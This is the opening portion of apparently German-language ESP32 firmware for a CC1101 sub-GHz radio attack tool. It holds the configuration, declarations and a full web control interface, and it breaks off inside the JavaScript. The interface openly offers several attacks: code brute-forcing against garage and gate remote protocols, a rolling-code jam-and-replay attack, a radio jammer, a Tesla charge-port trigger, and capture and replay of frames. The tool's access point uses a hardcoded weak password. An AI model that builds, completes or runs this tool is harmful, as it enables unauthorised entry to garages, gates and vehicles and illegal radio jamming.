/*
 * ═══════════════════════════════════════════════════════════════
 * CC1101 PROFESSIONAL RF TOOL v0.8.1 - Blue EDITION
 * ═══════════════════════════════════════════════════════════════
 * Board:     ESP32 Dev Module
 * CPU Speed: 240 MHz
 * Libraries: ELECHOUSE_CC1101_SRC_DRV
 *            Adafruit_GFX
 *            Adafruit_SSD1306
 *            WiFi, WebServer, Preferences, EEPROM
 * Pins:      SCK=18 MISO=19 MOSI=23 SS=5 GDO0=2 GDO2=4
 *            OLED SDA=21 SCL=22
 * ═══════════════════════════════════════════════════════════════
 */

#include <WiFi.h>
#include <WebServer.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <EEPROM.h>
#include <SPI.h>
#include <Preferences.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Update.h>

// ═══════════════════════════════════════════════════════════════
// HARDWARE PINS & DISPLAY
// ═══════════════════════════════════════════════════════════════
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define OLED_ADDRESS 0x3C

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
bool displayEnabled = false;

byte sck = 18;
byte miso = 19;
byte mosi = 23;
byte ss = 5;
int gdo0 = 2;
int gdo2 = 4;

// ═══════════════════════════════════════════════════════════════
// WIFI
// ═══════════════════════════════════════════════════════════════
const char *AP_SSID = "CC1101_PRO";
const char *AP_PASSWORD = "12345678";
String connectedSSID = "";
String wifiMode = "AP";

WebServer server(80);
Preferences preferences;

// ═══════════════════════════════════════════════════════════════
// BUFFER SIZES
// ═══════════════════════════════════════════════════════════════
#define CCBUFFERSIZE 64
#define RECORDINGBUFFERSIZE 4096
#define EPROMSIZE 512
#define MAX_FRAMES 50
#define MAX_SPECTRUM_POINTS 100
#define MAX_ROLLING_CODES 5
#define STATS_HISTORY 20

byte ccreceivingbuffer[CCBUFFERSIZE] = { 0 };
byte ccsendingbuffer[CCBUFFERSIZE] = { 0 };
byte bigrecordingbuffer[RECORDINGBUFFERSIZE] = { 0 };
int bigrecordingbufferindex = 0;

// ═══════════════════════════════════════════════════════════════
// FORWARD DECLARATIONS
// ═══════════════════════════════════════════════════════════════
void cc1101initialize();
void saveCC1101Config();
void loadCC1101Config();
void stopBruteForce();
void pauseBruteForce();
void resumeBruteForce();
void stopRollingCodeAttack();
void stopScanThenBrute();
void pauseScanThenBrute();
void resumeScanThenBrute();
void processBruteForceChunk();
void processScanThenBrute();
void processRollingCodeAttack();
void updateDisplay();
String byteToHexString(byte *buf, int len);
String formatUptime(unsigned long seconds);
void analyzeCapturedFrame(int idx);
void initBruteForce(uint8_t protocolIdx, uint8_t bits, uint32_t start, uint32_t end, uint8_t repeat, uint16_t interDelay, uint8_t chunk, bool autoStop);
void initRollingCodeAttack(float freq, uint8_t maxCodes, uint32_t jamDuration, uint32_t rxWindow);
void initScanThenBrute(float scanStart, float scanStop, uint8_t bruteProto, uint8_t bruteBits, uint8_t bruteRepeat, uint16_t bruteDelay);
void replayRollingCode(uint8_t idx);
// ═══════════════════════════════════════════════════════════════
// HTML PAGE - PROGMEM
// ═══════════════════════════════════════════════════════════════
const char HTML_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>CC1101 PRO v0.8.1 Blue Edition</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0f172a;color:#e2e8f0;font-family:'Segoe UI',sans-serif;font-size:0.85rem}
.hdr{background:linear-gradient(135deg,#1e3a5f,#0f172a);padding:10px 15px;
     display:flex;justify-content:space-between;align-items:center;
     border-bottom:1px solid #1e3a5f;position:sticky;top:0;z-index:100}
.hdr h1{font-size:1.1rem;color:#60a5fa;letter-spacing:2px}
.hdr-info{display:flex;gap:12px;font-size:0.72rem;color:#94a3b8}
.hdr-info span{display:flex;align-items:center;gap:4px}
.tabs{display:flex;overflow-x:auto;background:#0f172a;
      border-bottom:2px solid #1e3a5f;padding:0 10px;gap:2px}
.tab{padding:8px 12px;cursor:pointer;color:#64748b;font-size:0.78rem;
     border-bottom:2px solid transparent;white-space:nowrap;transition:all .2s}
.tab.active{color:#60a5fa;border-bottom-color:#60a5fa}
.tab:hover{color:#93c5fd}
.page{display:none;padding:12px;max-width:900px;margin:0 auto}
.page.active{display:block}
.card{background:#1e293b;border:1px solid #334155;border-radius:8px;
      padding:12px;margin-bottom:10px}
.card h3{color:#60a5fa;font-size:0.85rem;margin-bottom:8px;
         display:flex;align-items:center;gap:6px}
.row{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-bottom:6px}
label{color:#94a3b8;font-size:0.75rem;min-width:60px}
input,select{background:#0f172a;border:1px solid #334155;color:#e2e8f0;
             padding:4px 8px;border-radius:4px;font-size:0.78rem;
             width:110px}
input:focus,select:focus{outline:none;border-color:#60a5fa}
button{background:#1d4ed8;color:#fff;border:none;padding:5px 12px;
       border-radius:4px;cursor:pointer;font-size:0.78rem;transition:all .2s}
button:hover{background:#2563eb;transform:translateY(-1px)}
button.red{background:#dc2626}button.red:hover{background:#ef4444}
button.grn{background:#16a34a}button.grn:hover{background:#22c55e}
button.orn{background:#d97706}button.orn:hover{background:#f59e0b}
button.prp{background:#7c3aed}button.prp:hover{background:#8b5cf6}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:0.7rem;
       background:#334155;color:#94a3b8;margin-left:6px}
.badge.on{background:#16a34a;color:#fff}
.badge.off{background:#991b1b;color:#fff}
.prog-wrap{height:10px;background:#0f172a;border-radius:5px;overflow:hidden;
           border:1px solid #334155;margin:4px 0}
.prog-fill{height:100%;background:linear-gradient(90deg,#1d4ed8,#60a5fa);
           border-radius:5px;transition:width .3s;width:0%}
.log-box{background:#020617;border:1px solid #1e3a5f;border-radius:6px;
         height:130px;overflow-y:auto;padding:6px;font-family:monospace;
         font-size:0.72rem;color:#4ade80}
textarea{background:#020617;border:1px solid #334155;color:#4ade80;
         padding:6px;border-radius:4px;font-family:monospace;font-size:0.72rem;
         width:100%;resize:vertical}
.stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:8px}
.stat-box{background:#0f172a;border:1px solid #1e3a5f;border-radius:6px;
          padding:8px;text-align:center}
.stat-val{font-size:1.3rem;font-weight:bold;color:#60a5fa}
.stat-lbl{font-size:0.68rem;color:#64748b;margin-top:2px}
.frame-item{background:#0f172a;border:1px solid #1e3a5f;border-radius:5px;
            padding:6px;margin-bottom:5px;font-size:0.75rem}
.frame-item:hover{border-color:#334155}
canvas{background:#0f172a;border:1px solid #334155;border-radius:4px;
       width:100%;height:140px}
.rssi-bar{height:8px;background:#0f172a;border-radius:4px;overflow:hidden;
          border:1px solid #334155;width:80px;display:inline-block;vertical-align:middle}
.rssi-fill{height:100%;border-radius:4px;transition:width .5s}
pre{background:#020617;padding:8px;border-radius:4px;font-size:0.7rem;
    white-space:pre-wrap;word-break:break-all;color:#a5b4fc;
    max-height:120px;overflow-y:auto;border:1px solid #1e3a5f}
.wifi-item{padding:5px 8px;border:1px solid #1e3a5f;border-radius:4px;
           margin:3px 0;cursor:pointer;font-size:0.75rem}
.wifi-item:hover{background:#1e293b}
</style>
</head>
<body>

<!-- HEADER -->
<div class="hdr">
  <h1>📡 CC1101 PRO <span style="color:#94a3b8;font-size:0.8rem">v0.8.1</span></h1>
  <div class="hdr-info">
    <span>📶 <span id="hFreq">433.92</span> MHz</span>
    <span>📊 <span id="hRSSI">-</span> dBm</span>
    <span>⚙️ <span id="hMode">IDLE</span></span>
    <span>🌐 <span id="hIP">-</span></span>
    <span>⏱️ <span id="hUp">-</span></span>
  </div>
</div>

<!-- TABS -->
<div class="tabs">
  <div class="tab active" onclick="tab('cfg')">⚙️ Config</div>
  <div class="tab" onclick="tab('rx')">📥 RX/TX</div>
  <div class="tab" onclick="tab('frames')">🗂️ Frames</div>
  <div class="tab" onclick="tab('raw')">⚡ RAW</div>
  <div class="tab" onclick="tab('scan')">📶 Scan</div>
  <div class="tab" onclick="tab('brute')">🔨 Brute</div>
  <div class="tab" onclick="tab('rolling')">🎲 Rolling</div>
  <div class="tab" onclick="tab('stb')">🚀 S+B</div>
  <div class="tab" onclick="tab('attack')">⚡ Angriffe</div>
  <div class="tab" onclick="tab('wifi')">📡 WiFi</div>
</div>

<!-- ═══ CONFIG TAB ════════════════════════════════════════ -->
<div id="p_cfg" class="page active">
  <div class="card">
    <h3>📻 Basisparameter</h3>
    <div class="row">
      <label>Freq MHz</label>
      <input id="freq" type="number" step="0.01" min="300" max="928" value="433.92">
      <button onclick="setFreq()">Set</button>
    </div>
    <div class="row">
      <label>Modulation</label>
      <select id="mod" onchange="setMod()">
        <option value="0">2-FSK</option>
        <option value="1">GFSK</option>
        <option value="2" selected>ASK/OOK</option>
        <option value="3">4-FSK</option>
        <option value="4">MSK</option>
      </select>
    </div>
    <div class="row">
      <label>TX Power</label>
      <select id="power" onchange="setPow()">
        <option value="-30">-30 dBm</option>
        <option value="-20">-20 dBm</option>
        <option value="-15">-15 dBm</option>
        <option value="-10">-10 dBm</option>
        <option value="0">0 dBm</option>
        <option value="5">5 dBm</option>
        <option value="7">7 dBm</option>
        <option value="10" selected>10 dBm</option>
      </select>
    </div>
    <div class="row">
      <label>Deviation</label>
      <input id="dev" type="number" step="0.1" value="47.60" style="width:90px">
      <button onclick="setDev()">Set</button>
    </div>
    <div class="row">
      <label>DataRate</label>
      <input id="drate" type="number" step="0.1" value="9.6" style="width:90px">
      <button onclick="setDrate()">Set</button>
    </div>
    <div class="row">
      <label>RxBW</label>
      <select id="rxbw" onchange="setRxBW()">
        <option value="58.03">58.03 kHz</option>
        <option value="67.70">67.70 kHz</option>
        <option value="81.50">81.50 kHz</option>
        <option value="101.56">101.56 kHz</option>
        <option value="116.07">116.07 kHz</option>
        <option value="135.42">135.42 kHz</option>
        <option value="162.50">162.50 kHz</option>
        <option value="203.13">203.13 kHz</option>
        <option value="232.14">232.14 kHz</option>
        <option value="270.83">270.83 kHz</option>
        <option value="325.00">325.00 kHz</option>
        <option value="406.25">406.25 kHz</option>
        <option value="541.67">541.67 kHz</option>
        <option value="650.00">650.00 kHz</option>
        <option value="812.50" selected>812.50 kHz</option>
      </select>
    </div>
    <div class="row">
      <label>Channel</label>
      <input id="ch" type="number" min="0" max="255" value="0" style="width:70px">
      <button onclick="setCh()">Set</button>
    </div>
  </div>

  <div class="card">
    <h3>🔧 Erweiterte Parameter</h3>
    <div class="row">
      <label>SyncMode</label>
      <select id="syncmode" onchange="setSyncMode()">
        <option value="0">No sync</option>
        <option value="1">16 bits</option>
        <option value="2" selected>16 bits+carrier</option>
        <option value="3">30 of 32 bits</option>
      </select>
    </div>
    <div class="row">
      <label>SyncWord H</label>
      <input id="synch" type="number" min="0" max="255" value="211" style="width:70px">
      <label>L</label>
      <input id="syncl" type="number" min="0" max="255" value="145" style="width:70px">
      <button onclick="setSyncWord()">Set</button>
    </div>
    <div class="row">
      <label>PktFormat</label>
      <select id="pktfmt" onchange="setPktFmt()">
        <option value="0" selected>Normal</option>
        <option value="1">Sync serial</option>
        <option value="2">Random TX</option>
        <option value="3">Async serial</option>
      </select>
    </div>
    <div class="row">
      <label>LenConfig</label>
      <select id="lencfg" onchange="setLenCfg()">
        <option value="0">Fixed</option>
        <option value="1" selected>Variable</option>
        <option value="2">Infinite</option>
      </select>
    </div>
    <div class="row">
      <label>Manchester</label>
      <select id="manch" onchange="setManch()">
        <option value="0" selected>Aus</option>
        <option value="1">An</option>
      </select>
      <label>FEC</label>
      <select id="fec" onchange="setFEC()">
        <option value="0" selected>Aus</option>
        <option value="1">An</option>
      </select>
      <label>CRC</label>
      <select id="crc" onchange="setCRC()">
        <option value="0">Aus</option>
        <option value="1" selected>An</option>
      </select>
    </div>
    <div class="row">
      <label>WhiteData</label>
      <select id="white" onchange="setWhite()">
        <option value="0" selected>Aus</option>
        <option value="1">An</option>
      </select>
      <label>DCFilter</label>
      <select id="dcf" onchange="setDCF()">
        <option value="0" selected>An</option>
        <option value="1">Aus</option>
      </select>
    </div>
  </div>

  <div class="card">
    <h3>💾 Schnellzugriff Frequenzen</h3>
    <div class="row" style="flex-wrap:wrap;gap:6px">
      <button onclick="qFreq(433.92)">433.92</button>
      <button onclick="qFreq(433.42)">433.42</button>
      <button onclick="qFreq(434.42)">434.42</button>
      <button onclick="qFreq(868.35)">868.35</button>
      <button onclick="qFreq(315.00)">315.00</button>
      <button onclick="qFreq(310.00)">310.00</button>
      <button onclick="qFreq(303.87)">303.87</button>
      <button onclick="qFreq(390.00)">390.00</button>
    </div>
  </div>

  <div class="card">
    <h3>📊 Live Status</h3>
    <div class="stat-grid">
      <div class="stat-box"><div class="stat-val" id="sRSSI">-</div><div class="stat-lbl">RSSI dBm</div></div>
      <div class="stat-box"><div class="stat-val" id="sSNR">-</div><div class="stat-lbl">SNR dB</div></div>
      <div class="stat-box"><div class="stat-val" id="sNoise">-</div><div class="stat-lbl">Noise dBm</div></div>
      <div class="stat-box"><div class="stat-val" id="sMode">-</div><div class="stat-lbl">Mode</div></div>
      <div class="stat-box"><div class="stat-val" id="sTX">0</div><div class="stat-lbl">TX Gesamt</div></div>
      <div class="stat-box"><div class="stat-val" id="sRX">0</div><div class="stat-lbl">RX Gesamt</div></div>
      <div class="stat-box"><div class="stat-val" id="sRAM">-</div><div class="stat-lbl">RAM frei</div></div>
      <div class="stat-box"><div class="stat-val" id="sUptime">-</div><div class="stat-lbl">Uptime</div></div>
    </div>
    <div class="row" style="margin-top:8px;gap:6px">
      <button onclick="calibrate()" class="grn">🎯 Kalibrieren</button>
      <button onclick="saveConfig()" class="orn">💾 Speichern</button>
      <button onclick="initCC()">🔄 CC1101 Init</button>
      <button onclick="stopAll()" class="red">⏹ STOP ALL</button>
    </div>
    <div class="row">
      <span style="font-size:0.72rem;color:#64748b">Peak: <span id="sPeak">-</span> dBm @ <span id="sPeakF">-</span> MHz</span>
    </div>
  </div>
  <div class="log-box" id="logBox"></div>
</div>

<!-- ═══ RX/TX TAB ════════════════════════════════════════ -->
<div id="p_rx" class="page">
  <div class="card">
    <h3>📥 Empfangen <span class="badge off" id="rxBadge">OFF</span></h3>
    <div class="row">
      <button class="grn" onclick="startRX()">▶ RX AN</button>
      <button class="red" onclick="stopRX()">⏹ RX AUS</button>
      <button onclick="getData()">📋 Daten holen</button>
    </div>
    <div class="row" style="margin-top:4px">
      <span style="font-size:0.75rem;color:#94a3b8">Letztes Paket:</span>
      <span id="lastData" style="font-family:monospace;font-size:0.75rem;color:#4ade80">-</span>
    </div>
    <div class="row">
      <span style="font-size:0.72rem;color:#64748b">RSSI: <span id="rxRSSI">-</span> dBm | Länge: <span id="rxLen">-</span> Bytes</span>
    </div>
  </div>
  <div class="card">
    <h3>📤 Senden</h3>
    <div class="row">
      <label>HEX Daten</label>
      <input id="txData" placeholder="AABBCC..." style="width:200px">
      <button class="grn" onclick="sendData()">📤 Senden</button>
    </div>
    <div class="row">
      <label>Wiederh.</label>
      <input id="txRep" type="number" value="1" min="1" max="100" style="width:60px">
      <label>Delay ms</label>
      <input id="txDel" type="number" value="100" min="0" style="width:70px">
    </div>
    <div class="row">
      <button onclick="sendPreset('AABBCC')">Preset 1</button>
      <button onclick="sendPreset('FF00FF')">Preset 2</button>
      <button onclick="sendPreset('DEADBEEF')">Preset 3</button>
    </div>
  </div>
  <div class="card">
    <h3>🎙️ Recording <span class="badge off" id="recBadge">OFF</span></h3>
    <div class="row">
      <button class="grn" onclick="startREC()">⏺ REC AN</button>
      <button class="red" onclick="stopREC()">⏹ REC AUS</button>
    </div>
    <div class="row">
      <span style="font-size:0.72rem;color:#64748b">
        Aufgezeichnete Frames: <strong id="recFrames">0</strong>
      </span>
    </div>
  </div>
  <div class="log-box" id="rxLog"></div>
</div>

<!-- ═══ FRAMES TAB ════════════════════════════════════════ -->
<div id="p_frames" class="page">
  <div class="card">
    <h3>🗂️ Gespeicherte Frames <span id="fCount" style="color:#4ade80">0</span></h3>
    <div class="row">
      <button onclick="loadFrames()">🔄 Laden</button>
      <button onclick="replayAll()" class="grn">📤 Alle senden</button>
      <button onclick="analyzeLastFrame()" class="prp">🔍 Letzten analysieren</button>
      <button onclick="exportFrames()" class="orn">💾 Export</button>
      <button onclick="clearFrames()" class="red">🗑️ Löschen</button>
    </div>
    <div id="analyzeRes" style="font-size:0.75rem;color:#a5b4fc;padding:4px 0"></div>
    <div id="frameList" style="max-height:200px;overflow-y:auto;margin-top:6px">
      <p style="text-align:center;color:#475569;padding:15px">Keine Frames</p>
    </div>
  </div>
  <div class="card">
    <h3>📤 Frame Replay</h3>
    <div class="row">
      <label>Frame #</label>
      <input id="rpIdx" type="number" value="0" min="0" style="width:60px">
      <label>x</label>
      <input id="rpRep" type="number" value="5" min="1" style="width:55px">
      <label>ms</label>
      <input id="rpDel" type="number" value="100" min="0" style="width:65px">
      <button class="grn" onclick="replayFrame()">📤 Senden</button>
    </div>
    <pre id="frameDetail">Frame Details erscheinen hier...</pre>
  </div>
</div>

<!-- ═══ RAW TAB ════════════════════════════════════════ -->
<div id="p_raw" class="page">
  <div class="card">
    <h3>⚡ RAW Modus <span class="badge off" id="rawSt">OFF</span></h3>
    <div class="row">
      <button class="grn" onclick="rawRX()">▶ RAW RX</button>
      <button onclick="rawREC()">⏺ RAW REC</button>
      <button class="red" onclick="rawStop()">⏹ Stop</button>
    </div>
    <div class="row">
      <button onclick="getRaw()">📋 Buffer laden</button>
      <button onclick="clearRaw()" class="red">🗑️ Löschen</button>
      <button onclick="exportRaw()" class="orn">💾 Export</button>
      <span style="font-size:0.72rem;color:#64748b">Bytes: <strong id="rawBytes">0</strong></span>
    </div>
  </div>
  <div class="card">
    <h3>📋 RAW Buffer (HEX)</h3>
    <textarea id="rawDisp" rows="8" placeholder="RAW HEX Daten erscheinen hier..." readonly></textarea>
  </div>
</div>

<!-- ═══ SCAN TAB ════════════════════════════════════════ -->
<div id="p_scan" class="page">
  <div class="card">
    <h3>📶 Frequenz Scan</h3>
    <div class="row">
      <label>Von MHz</label>
      <input id="scStart" type="number" step="0.01" value="433.0" style="width:90px">
      <label>Bis MHz</label>
      <input id="scStop"  type="number" step="0.01" value="434.0" style="width:90px">
      <button class="grn" onclick="startScan()">▶ Scan</button>
      <button class="red" onclick="stopScan()">⏹ Stop</button>
    </div>
    <div class="prog-wrap"><div class="prog-fill" id="scPF"></div></div>
    <div class="row">
      <span style="font-size:0.72rem;color:#64748b">
        Aktuell: <strong id="scCur">-</strong> |
        Best: <strong id="scBestF">-</strong> MHz @ <strong id="scBestR">-</strong>
      </span>
    </div>
    <div class="row">
      <button onclick="applyBestFreq()" class="orn">✅ Beste Freq übernehmen</button>
    </div>
    <span style="font-size:0.68rem;color:#475569" id="scPT"></span>
  </div>
  <div class="card">
    <h3>📊 Spektrum Analyzer</h3>
    <div class="row">
      <label>Von MHz</label>
      <input id="spStart" type="number" step="0.1" value="433.0" style="width:90px">
      <label>Bis MHz</label>
      <input id="spStop"  type="number" step="0.1" value="434.0" style="width:90px">
      <button class="grn" onclick="runSpectrum()">📊 Spektrum</button>
    </div>
    <canvas id="spCanvas" width="500" height="140"></canvas>
    <div id="spInfo" style="font-size:0.72rem;color:#64748b;margin-top:4px"></div>
  </div>
</div>

<!-- ═══ BRUTE TAB ════════════════════════════════════════ -->
<div id="p_brute" class="page">
  <div class="card">
    <h3>🔨 Brute Force <span class="badge off" id="bSt">OFF</span></h3>
    <div class="row">
      <label>Protokoll</label>
      <select id="bProto" onchange="updateBruteBits()" style="width:130px">
        <option value="0">Princeton</option>
        <option value="1">PT2262</option>
        <option value="2">EV1527</option>
        <option value="3">HT12E</option>
        <option value="4">Came</option>
        <option value="5">Nice</option>
        <option value="6">Faac</option>
        <option value="7">Hormann</option>
        <option value="8">KeeLoq</option>
        <option value="9">Somfy RTS</option>
        <option value="10">Linear</option>
        <option value="11">Custom</option>
      </select>
      <label>Bits</label>
      <input id="bBits" type="number" value="24" min="1" max="32" style="width:55px">
    </div>
    <div class="row">
      <label>Start (HEX)</label>
      <input id="bStart" placeholder="0" style="width:90px">
      <label>End (HEX)</label>
      <input id="bEnd" placeholder="0=max" style="width:90px">
    </div>
    <div class="row">
      <label>Repeat</label>
      <input id="bRep" type="number" value="3" min="1" max="20" style="width:55px">
      <label>Delay µs</label>
      <input id="bDel" type="number" value="100" min="0" style="width:70px">
    </div>
    <div class="row">
      <button class="grn" onclick="startBrute()">▶ Start</button>
      <button class="orn" onclick="pauseBrute()">⏸ Pause</button>
      <button class="red" onclick="stopBrute()">⏹ Stop</button>
    </div>
    <div class="prog-wrap"><div class="prog-fill" id="bPF"></div></div>
    <div class="stat-grid" style="margin-top:6px">
      <div class="stat-box"><div class="stat-val" id="bCur">-</div><div class="stat-lbl">Code</div></div>
      <div class="stat-box"><div class="stat-val" id="bTotal">-</div><div class="stat-lbl">Gesamt</div></div>
      <div class="stat-box"><div class="stat-val" id="bSpd">-</div><div class="stat-lbl">Speed</div></div>
      <div class="stat-box"><div class="stat-val" id="bRemain">-</div><div class="stat-lbl">Restzeit</div></div>
      <div class="stat-box"><div class="stat-val" id="bSent">-</div><div class="stat-lbl">Gesendet</div></div>
    </div>
    <span style="font-size:0.68rem;color:#475569" id="bPT"></span>
  </div>
  <div class="card">
    <h3>🎯 Smart Brute (aus Frame)</h3>
    <div class="row">
      <label>Frame #</label>
      <input id="sbFrame" type="number" value="0" min="0" style="width:60px">
      <label>± Range</label>
      <input id="sbRange" type="number" value="1000" style="width:80px">
      <button class="prp" onclick="smartBrute()">🎯 Smart Brute</button>
    </div>
  </div>
</div>

<!-- ═══ ROLLING TAB ════════════════════════════════════════ -->
<div id="p_rolling" class="page">
  <div class="card">
    <h3>🎲 Rolling Code Angriff <span class="badge off" id="rlSt">OFF</span></h3>
    <div class="row">
      <label>Freq MHz</label>
      <input id="rlFreq" type="number" step="0.01" value="433.92" style="width:90px">
      <label>Max Codes</label>
      <input id="rlMax" type="number" value="3" min="1" max="5" style="width:55px">
    </div>
    <div class="row">
      <label>Jam ms</label>
      <input id="rlJam" type="number" value="10000" style="width:80px">
      <label>RX ms</label>
      <input id="rlRx" type="number" value="20000" style="width:80px">
    </div>
    <div class="row">
      <button class="grn" onclick="startRolling()">▶ Start</button>
      <button class="red" onclick="stopRolling()">⏹ Stop</button>
    </div>
    <div class="prog-wrap"><div class="prog-fill" id="rlPF"></div></div>
    <div class="row">
      <span style="font-size:0.72rem;color:#64748b">
        Gefangen: <strong id="rlCap">0</strong> |
        Phase: <strong id="rlPhase">-</strong>
      </span>
    </div>
    <span style="font-size:0.68rem;color:#475569" id="rlPT"></span>
  </div>
  <div class="card">
    <h3>📋 Gefangene Codes</h3>
    <div class="row">
      <button onclick="loadRollingCodes()">🔄 Laden</button>
      <button class="grn" onclick="replayRolling(0)">📤 Code 1</button>
      <button class="grn" onclick="replayRolling(1)">📤 Code 2</button>
      <button class="grn" onclick="replayRolling(2)">📤 Code 3</button>
    </div>
    <div id="rlCodeList" style="max-height:150px;overflow-y:auto;margin-top:6px;font-size:0.75rem;color:#94a3b8">
      Keine Codes
    </div>
  </div>
</div>

<!-- ═══ SCAN+BRUTE TAB ════════════════════════════════════ -->
<div id="p_stb" class="page">
  <div class="card">
    <h3>🚀 Scan + Brute <span class="badge off" id="stbSt">OFF</span></h3>
    <div id="stbPhase" style="font-size:0.75rem;color:#a5b4fc;margin-bottom:6px">Phase: IDLE</div>
    <div class="row">
      <label>Scan Von</label>
      <input id="stbS" type="number" step="0.1" value="433.0" style="width:85px">
      <label>Bis MHz</label>
      <input id="stbE" type="number" step="0.1" value="434.0" style="width:85px">
    </div>
    <div class="row">
      <label>Protokoll</label>
      <select id="stbP" style="width:120px">
        <option value="0">Princeton</option>
        <option value="2">EV1527</option>
        <option value="4">Came</option>
        <option value="5">Nice</option>
      </select>
      <label>Bits</label>
      <input id="stbB" type="number" value="24" min="1" max="32" style="width:55px">
    </div>
    <div class="row">
      <label>Repeat</label>
      <input id="stbR" type="number" value="3" min="1" style="width:55px">
      <label>Delay µs</label>
      <input id="stbD" type="number" value="100" min="0" style="width:70px">
    </div>
    <div class="row">
      <button class="grn" onclick="startSTB()">🚀 Start</button>
      <button class="orn" onclick="pauseSTB()">⏸ Pause</button>
      <button class="red" onclick="stopSTB()">⏹ Stop</button>
    </div>
  </div>
  <div class="card">
    <h3>📶 Scan Fortschritt</h3>
    <div class="prog-wrap"><div class="prog-fill" id="stbSF"></div></div>
    <div class="row">
      <span style="font-size:0.72rem;color:#64748b">
        Best: <strong id="stbBFreq">-</strong> MHz @ <strong id="stbBRSSI">-</strong> dBm
      </span>
    </div>
    <span style="font-size:0.68rem;color:#475569" id="stbST"></span>
    <div id="stbTopFreqs" style="font-size:0.72rem;color:#94a3b8;margin-top:6px"></div>
  </div>
  <div class="card">
    <h3>🔨 Brute Fortschritt</h3>
    <div class="prog-wrap"><div class="prog-fill" id="stbBF"></div></div>
    <div class="row">
      <span style="font-size:0.72rem;color:#64748b">
        Code: <strong id="stbBCode">-</strong> |
        Speed: <strong id="stbBSpd">-</strong>/s
      </span>
    </div>
    <span style="font-size:0.68rem;color:#475569" id="stbBT"></span>
  </div>
</div>

<!-- ═══ ANGRIFFE TAB ════════════════════════════════════ -->
<div id="p_attack" class="page">
  <div class="card">
    <h3>⚡ Jammer <span class="badge off" id="jamSt">OFF</span></h3>
    <div class="row">
      <label>Freq MHz</label>
      <input id="jamFreqI" type="number" step="0.01" value="433.92" style="width:90px">
      <label>Modulation</label>
      <select id="jamMod" style="width:100px">
        <option value="2" selected>ASK/OOK</option>
        <option value="0">2-FSK</option>
        <option value="1">GFSK</option>
      </select>
      <button class="red" onclick="startJam()">⚡ JAM AN</button>
      <button onclick="stopJam()">⏹ JAM AUS</button>
      <span class="badge off" id="jamSt2">OFF</span>
    </div>
  </div>
  <div class="card">
    <h3>🚗 Tesla Ladeport</h3>
    <div class="row">
      <label>Variante</label>
      <select id="teslaVar" style="width:130px">
        <option value="0">Original</option>
        <option value="1">Model 3/Y</option>
      </select>
      <label>Repeat</label>
      <input id="teslaRep" type="number" value="10" min="1" style="width:60px">
      <button class="prp" onclick="openTesla()">🚗 Ausführen</button>
    </div>
  </div>
  <div class="card">
    <h3>📤 Manuell Senden</h3>
    <div class="row">
      <label>HEX</label>
      <input id="manHex" placeholder="AABBCCDD" style="width:160px">
      <label>Freq</label>
      <input id="manFreq" type="number" step="0.01" value="433.92" style="width:85px">
    </div>
    <div class="row">
      <label>Mod</label>
      <select id="manMod" style="width:100px">
        <option value="2" selected>ASK/OOK</option>
        <option value="0">2-FSK</option>
        <option value="1">GFSK</option>
      </select>
      <label>Repeat</label>
      <input id="manRep" type="number" value="5" min="1" style="width:55px">
      <label>Delay ms</label>
      <input id="manDel" type="number" value="100" min="0" style="width:65px">
    </div>
    <div class="row">
      <button class="grn" onclick="manualSend()">📤 Senden</button>
    </div>
  </div>
  <div class="card">
    <h3>🔄 OTA Update</h3>
    <div class="row">
      <input type="file" id="otaFile" accept=".bin" style="width:auto;font-size:0.75rem">
      <button class="orn" onclick="startOTA()">🔄 Flash</button>
    </div>
    <div id="otaPW" style="display:none;margin-top:6px">
      <div class="prog-wrap"><div class="prog-fill" id="otaPF"></div></div>
      <div id="otaStatus" style="font-size:0.75rem;color:#94a3b8;margin-top:4px"></div>
      <span style="font-size:0.68rem;color:#475569" id="otaPT"></span>
    </div>
  </div>
</div>

<!-- ═══ WIFI TAB ════════════════════════════════════════ -->
<div id="p_wifi" class="page">
  <div class="card">
    <h3>📡 WiFi Status</h3>
    <div class="stat-grid">
      <div class="stat-box"><div class="stat-val" id="wMode">-</div><div class="stat-lbl">Modus</div></div>
      <div class="stat-box"><div class="stat-val" id="wSSID" style="font-size:0.9rem">-</div><div class="stat-lbl">SSID</div></div>
      <div class="stat-box"><div class="stat-val" id="wIP" style="font-size:0.9rem">-</div><div class="stat-lbl">IP</div></div>
      <div class="stat-box"><div class="stat-val" id="wRSSI">-</div><div class="stat-lbl">WiFi RSSI</div></div>
    </div>
    <div id="wifiConfigInfo" style="font-size:0.75rem;color:#64748b;margin-top:6px"></div>
  </div>
  <div class="card">
    <h3>🔍 Netzwerke scannen</h3>
    <div class="row">
      <button onclick="scanWifi()">🔍 Scan</button>
      <button onclick="getWifiStatus()" class="orn">🔄 Status</button>
      <button onclick="switchAP()" class="red">📡 → AP Modus</button>
    </div>
    <div id="wifiList" style="max-height:200px;overflow-y:auto;margin-top:8px"></div>
  </div>
  <div class="card">
    <h3>🔗 Verbinden</h3>
    <div class="row">
      <label>SSID</label>
      <input id="wSSIDi" placeholder="Netzwerk SSID" style="width:180px">
    </div>
    <div class="row">
      <label>Passwort</label>
      <input id="wPassi" type="password" placeholder="Passwort" style="width:180px">
    </div>
    <div class="row">
      <button class="grn" onclick="connectWifi()">🔗 Verbinden & Neustart</button>
    </div>
  </div>
</div>

<script>
// ─── GLOBALS ─────────────────────────────────────────────────
let scanRun=false,bestFreq=433.92,bestRSSI=-120;
let bTimer=null,rlTimer=null,stbTimer=null;
let statusTimer=null;

// ─── UTILITY ─────────────────────────────────────────────────
function tab(id){
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.getElementById('p_'+id).classList.add('active');
  event.target.classList.add('active');
}
async function api(url){
  try{
    const r=await fetch(url,{signal:AbortSignal.timeout(8000)});
    if(!r.ok)return null;
    return await r.text();
  }catch(e){log('❌ API Fehler: '+url.split('?')[0]);return null;}
}
function log(msg){
